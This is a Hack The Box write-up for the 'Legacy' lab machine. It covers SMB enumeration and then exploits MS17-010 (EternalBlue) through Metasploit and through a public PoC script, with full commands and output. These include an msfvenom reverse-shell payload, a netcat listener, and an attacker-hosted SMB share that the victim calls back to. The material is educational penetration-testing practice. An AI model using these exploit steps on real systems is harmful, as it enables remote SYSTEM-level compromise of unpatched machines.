layout: post
title: HTB Legacy
modified: 2021-05-24
categories: [Hack The Box]

# Hack The Box | Legacy

## Initial TCP Nmap Scan

```
nmap -sC -sV -oA nmap/initial-tcp-legacy 10.10.10.4   
```

## Full TCP Nmap Scan

```
nmap -p- -oA htb/legacy/nmap/full-tcp-legacy 10.10.10.4
```

### Output of Initial TCP Nmap Scan

```lua
Nmap scan report for 10.10.10.4
Host is up (0.077s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h30m33s, deviation: 2h07m16s, median: 4d23h00m33s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:08:52 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-05-28T20:36:26+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 23 08:36:43 2021 -- 1 IP address (1 host up) scanned in 64.79 seconds
```

#### Initial Thoughts Based On Nmap Scan

##### What are ports 139 and 445?

Observing the ports only three appear: `139, 445, and 3389`. Port 3389 has its port closed so it will not be considered. So now I am left with only two ports: `139, and 445`. Ports 139 and 445 deal with Server Message Block ("SMB") protocols. SMB is essentially a protocol that allows applications and services on networked computers to communicate with each other. SMB allows for core features such as printing, file sharing, device sharing, etc. Port 139 originally ran on top of `NetBIOS` using port 139. In simple terms, NetBIOS provides services related to the session layer of the `OSI model` which would allow computers to talk to each other on the same network (Local Area Network ("LAN")). Port 445 (used with later versions of SMB) began to use port 445 on top of a Transmission Control Protocol ("TCP"). TCP is simply a transport protocol that is used on top of Internet Protocol ("IP") to transmit packet. The IP relays datagrams across network boundaries and its routing enables internetworking and essentially establishes the internet.

##### How can these ports be exploited?

Again, SMB allows core features such as printing, file sharing, device sharing, etc. Knowing this, misconfigurations / poor security may have been overlooked. These misconfigurations / poor security can be things such as: null authentication (being able to get into SMB file shares with no authentication), ability to enumerate users through SMB, personally identifiable information ("PII"), etc. Another thing port 139 and 445 can be exploited by are simply out of date SMB versions. Some out of date SMB versions are highly vulnerable and can lead to a full system compromise so looking into that too is ideal.

## 139 - 445 SMB Enumeration

The first tool I will be using is Enum4linux which is a tool used for enumerating information from SMB. 

```
enum4linux -a 10.10.10.4
```

```
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun May 23 09:08:16 2021        
                                                           
 ==========================                                                                                            
|    Target Information    |                               
 ==========================                                
Target ........... 10.10.10.4                              
RID Range ........ 500-550,1000-1050           
Username ......... ''                                      
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none                                                                    

                                                           
 ================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.4    |
 ================================================== 
[+] Got domain/workgroup name: HTB                         

 ==========================================   
|    Nbtstat Information for 10.10.10.4    |               
 ========================================== 
Looking up status of 10.10.10.4                            
LEGACY          <00> -         B <ACTIVE>  Workstation Service      
HTB             <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name                                               
LEGACY          <20> -         B <ACTIVE>  File Server Service                                                 
HTB             <1e> - <GROUP> B <ACTIVE>  Browser Service Elections                                           
HTB             <1d> -         B <ACTIVE>  Master Browser                                                                                                                                                                             
..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser                                                      

MAC Address = 00-50-56-B9-08-52         

 ===================================                       
|    Session Check on 10.10.10.4    |
 =================================== 
[+] Server 10.10.10.4 allows sessions using username '', password ''                                                   

 ========================================= 
|    Getting domain SID for 10.10.10.4    |                
 ========================================= 
Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED                                                         
[+] Can't determine if host is part of domain or part of a workgroup                                                   

 ==================================== 
|    OS information on 10.10.10.4    |                     
 ==================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.                        
[+] Got OS info for 10.10.10.4 from smbclient: 
[+] Got OS info for 10.10.10.4 from srvinfo:               
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED         
                                                                                                                       
 ===========================                                                                                           
|    Users on 10.10.10.4    |                                                                                          
 ===========================                               
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED                                                   
                                                           
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED                                                    
                                                           
 =======================================                   
|    Share Enumeration on 10.10.10.4    |                  
 =======================================       
[E] Can't list shares: NT_STATUS_ACCESS_DENIED             


[+] Attempting to map shares on 10.10.10.4

 ================================================== 
|    Password Policy Information for 10.10.10.4    |
 ================================================== 
[E] Unexpected error from polenum:


[+] Attaching to 10.10.10.4 using a NULL share

[+] Trying protocol 139/SMB...

[!] Protocol failed: Cannot request session (Called Name:10.10.10.4)

[+] Trying protocol 445/SMB...

[!] Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)


[E] Failed to get password policy with rpcclient


 ============================ 
|    Groups on 10.10.10.4    |
 ============================ 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ===================================================================== 
|    Users on 10.10.10.4 via RID cycling (RIDS: 500-550,1000-1050)    |
 ===================================================================== 
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 =========================================== 
|    Getting printer info for 10.10.10.4    |
 =========================================== 
No printers returned.


enum4linux complete on Sun May 23 09:08:26 2021
```

Seeing the output of Enum4linux, it was able to get a null session meaning we were able to use an anonymous user by supplying a username and password of `''`, essentially an empty string. Looking at all of the output though we were not able to enumerate a lot. Sure we were able to get a null session, but we do not have the privileges to enumerate anything (note all of the `NT_STATUS_ACCESS_DENIED` messages). I could try to use other tools and see if they provide a different output (which isn't a bad thing to do), but this is looking like it will not budge in terms of gathering any information this way. So what's next?

`&nbsp;`

Looking into if SMB is vulnerable due to it being outdated is what I will be looking into next. This is fairly simple as Nmap has a feature known as the Nmap Scripting Enginge ("NSE"). NSE are simple scripts using the Lua programming language used to automate a variety of networking tasks. These tasks an include network discovery, version detection, and yes you guessed it, vulnerability detection. Nmap supplies a plethora of scripts to help us further enumerate and scan for vulnerabilities with SMB. Doing a quick google search of Nmap NSE SMB scripts will provide a lot of information on each specific script and what it is used for. For now, I will essentially be doing a full enumeration and vuln scan using a ton of NMAP scripts for SMB and seeing if anything is vulnerable.

```
nmap --script=smb2-capabilities,smb-print-text,smb2-security-mode.nse,smb-protocols,smb2-time.nse,smb-psexec,smb2-vuln-uptime,smb-security-mode,smb-server-stats,smb-double-pulsar-backdoor,smb-system-info,smb-vuln-conficker,smb-enum-groups,smb-vuln-cve2009-3103,smb-enum-processes,smb-vuln-cve-2017-7494,smb-vuln-ms06-025,smb-enum-shares,smb-vuln-ms07-029,smb-enum-users,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-ls,smb-vuln-ms10-061,smb-vuln-ms17-010,smb-os-discovery --script-args=unsafe=1 -T5 10.10.10.4
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-23 09:21 PDT           
Nmap scan report for 10.10.10.4                                                                       
Host is up (0.078s latency).                   
Not shown: 997 filtered ports
PORT     STATE  SERVICE 
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server

Host script results:
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\10.10.10.4\ADMIN$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.4\C$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.4\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: READ
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-05-28T21:22:05+03:00
|_smb-print-text: false
| smb-protocols: 
|   dialects: 
|_    NT LM 0.12 (SMBv1) [dangerous, but default]
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb-vuln-ms10-054: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb2-time: Protocol negotiation failed (SMB2)

Nmap done: 1 IP address (1 host up) scanned in 88.81 seconds
```

Seeing the output from Nmap, we can see some of the scripts failed (most likely because it was not vulnerable), but we do see that it found one vulnerability which is `smb-vuln-ms17-010`. This vulnerability is also known as `EternalBlue` which was developed by the NSA. If you want to read more about EternalBlue, you can check out a Wikipedia page about it [here](https://en.wikipedia.org/wiki/EternalBlue). For now, lets figure out if we can gain initial access to this machine through this attack vector.

## Exploiting EternalBlue

When approaching this exploit, there are two ways we can do this: manually, or with the Metasploit Framework. "The Metasploit Framework is a Ruby-based, modular penetration testing platform that enables you to write, test, and execute exploit code. The Metasploit Framework contains a suite of tools that you can use to test security vulnerabilities, enumerate networks, execute attacks, and evade detection. At its core, the Metasploit Framework is a collection of commonly used tools that provide a complete environment for penetration testing and exploit development" ([Rapid7](https://docs.rapid7.com/metasploit/msf-overview/)). Seeing what Metasploit is, it definitely sounds like an enticing option, but if you are prepping for the OSCP, you might want to do Metasploit and a manual method. The reason for this is using the Metasploit Framework is only allowed once for the OSCP. Knowing this, it seems practical to go and figure out how to manually exploit this as well as use the Metasploit Framework so let's do both.

#### Metasploit Framework

```
┌──(root@kali)-[~]
└─# msfconsole                          
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.0.41-dev                          ]
+ -- --=[ 2122 exploits - 1138 auxiliary - 360 post       ]
+ -- --=[ 594 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Enable HTTP request and response logging 
with set HttpTrace true

msf6 > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use exploit/windows/smb/ms17_010_psexec 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                            Required  Description
   ----                  ---------------                            --------  -----------
   DBGTRACE              false                                      yes       Show extra debug trace info
   LEAKATTEMPTS          99                                         yes       How many times to try to leak transaction
   NAMEDPIPE                                                        no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/word  yes       List of named pipes to check
                         lists/named_pipes.txt
   RHOSTS                                                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<
                                                                              path>'
   RPORT                 445                                        yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                              no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                             no        The service display name
   SERVICE_NAME                                                     no        The service name
   SHARE                 ADMIN$                                     yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal r
                                                                              ead/write folder share
   SMBDomain             .                                          no        The Windows domain to use for authentication
   SMBPass                                                          no        The password for the specified username
   SMBUser                                                          no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.126.147  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf6 exploit(windows/smb/ms17_010_psexec) > set lhost 10.10.14.36
lhost => 10.10.14.36
msf6 exploit(windows/smb/ms17_010_psexec) > set rhosts 10.10.10.4
rhosts => 10.10.10.4
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.36:4444 
[*] 10.10.10.4:445 - Target OS: Windows 5.1
[*] 10.10.10.4:445 - Filling barrel with fish... done
[*] 10.10.10.4:445 - <---------------- | Entering Danger Zone | ---------------->
[*] 10.10.10.4:445 -    [*] Preparing dynamite...
[*] 10.10.10.4:445 -            [*] Trying stick 1 (x86)...Boom!
[*] 10.10.10.4:445 -    [+] Successfully Leaked Transaction!
[*] 10.10.10.4:445 -    [+] Successfully caught Fish-in-a-barrel
[*] 10.10.10.4:445 - <---------------- | Leaving Danger Zone | ---------------->
[*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x81a8e168
[*] 10.10.10.4:445 - Built a write-what-where primitive...
[+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.4:445 - Selecting native target
[*] 10.10.10.4:445 - Uploading payload... zZKBrhbC.exe
[*] 10.10.10.4:445 - Created \zZKBrhbC.exe...
[+] 10.10.10.4:445 - Service started successfully...
[*] Sending stage (175174 bytes) to 10.10.10.4
[*] 10.10.10.4:445 - Deleting \zZKBrhbC.exe...
[*] Meterpreter session 1 opened (10.10.14.36:4444 -> 10.10.10.4:1031) at 2021-05-23 09:36:32 -0700

meterpreter >
```

And just like that we have a SYSTEM session. SYSTEM is the highest privileged session we can have on a Windows workstation. But I'm going to break down what exactly I entered in to get this SYSTEM session

First, you can simply type `msfconsole` in your terminal to get access to the Metasploit Framework. From here I needed to search for the `ms17-010` vulnerability within Metasploit Framework to see if they have modules I can use to exploit this vulnerability. To do this, you can type in `search [exploit_name]` to find the exploit you are searching for and see if it is present. For me, this was `search ms17-010`. The one that worked the best for me was: `2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 `. Now that we know the module exists, to use this module you are going to use the path that it provides. This would be `exploit/windows/smb/ms17_010_psexec`. 

`&nbsp;`

With that done, the only thing left to do is configure the module. To configure the module and see what values it needs to run, simply execute the `options` command. For this module, everything was already set in stone for the most part, the only thing that we needed to change was the `LHOST` and the `RHOST`. LHOST stands for local host, aka, your IP address. So this is going to be your HTB VPN IP address. Then there is RHOST, which stands for remote host. This is going to be the IP address of our target, so `10.10.10.4`. To enter in these values into the module, simply type the name and then an argument. For example: `RHOST 10.10.10.4`. This will set the RHOST as 10.10.10.4. All you need to do is set LHOST as well in a similar fashion and everything should be set. Now you can execute the `exploit` command and then get a shell! Easy as that.

#### Manual Exploit

When looking into manual exploits, there may be a chance that there is already a proof of concept ("PoC") publicly available. Looking up "ms17-010" into Google, I found a repo from the user "helviojunior" who has a pretty nice repo to clone from that will help us exploit ms17-010 without the Metasploit Framework. Link to the GitHub repo can be found [here](https://github.com/helviojunior/MS17-010.git). The specific file I'll be working with is the `send_and_execute.py` file.  To clone this repo you can run the following command:

```zsh
git clone https://github.com/helviojunior/MS17-010.git
```

The reason for this is that when looking into each of these files, this is the one that has been tested on Windows XP which is what our box is. With this exploit, we are going to need a payload. For this, we can use MSFvenom which will create our Windows reverse shell payload.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.36 LPORT=4444 -f exe > eternalblue.exe
```

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

Breaking down the flags, `-p` specifies what type of payload we want, `-f` specifies what format we want, which is an executable file (exe). LHOST is similar to what we saw in the Metasploit Framework section where LHOST is your local host and LPORT is your local port. With this payload, we will be creating an executable payload called `eternalblue.exe`. You could name this whatever you want and have `.exe` at the end. So now after this we should have an executable called `eternalblue.exe` in our working directory.

```zsh
ls -la eternalblue.exe
-rw-r--r-- 1 root root 73802 May 23 14:24 eternalblue.exe
```

Now I'm going to use the `send_and_execute.py` file to send over our reverse shell payload `eternalblue.exe`.

Looking at what is needed from this Python script, we see the following:

```
python send_and_execute.py                                         
send_and_execute.py <ip> <executable_file> [port] [pipe_name]
```

So we need to run the command `send_and_execute.py`, give an `ip address`, and an `executable file`. We have all of those! So let's pwn this machine manually.  Make sure you have a Netcat listener running in the background using the same LPORT you assigned when crafting your MSFvenom reverse shell payload.

```
nc -lvnp 4444
```

WIth my Netcat listener set listening on port 4444, just like I stated on my MSFvenom reverse shell payload, I am going to go ahead and execute the exploit.

```
python send_and_execute.py 10.10.10.4 eternalblue.exe

Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x81b2dda8
SESSION: 0xe17c1190
FLINK: 0x5bd48
InData: 0x5ae28
MID: 0xa
TRANS1: 0x58b50
TRANS2: 0x5ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe1fb0030
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe1fb00d0
overwriting token UserAndGroups
Sending file WIM5S5.exe...
Opening SVCManager on 10.10.10.4.....
Creating service HamL.....
Starting service HamL.....
The NETBIOS connection with the remote host timed out.
Removing service HamL.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done
```

Looking back at our reverse shell we successfully got a shell!

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.4] 1031
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

The `whoami` command is not running on the box, but we can get this to work an alternative way.

```
C:\WINDOWS\system32>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.
```

Kali Linux comes with Windows binaries that can allow us to run the `whoami` command. To do this, we can simply host our own SMB server and have the compromised Windows box call to our SMB server to execute the command. Firstly, let's get the SMB server set up. To do that you can run the following command:

```
smbserver.py share /usr/share/windows-binaries/

Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

With that running, we are hosting an SMB server named `share` under the directory `/usr/share/windows-binaries/` which is where the `whoami` binary resides. Now we can head back to our compromised Windows box and use the command `\\$IP\share\whoami.exe` to connect to the SMB server and run the `whoami` binary.

```
C:\WINDOWS\system32>\\10.10.14.36\share\whoami.exe
\\10.10.14.36\share\whoami.exe
NT AUTHORITY\SYSTEM
```

And we can see we are SYSTEM!

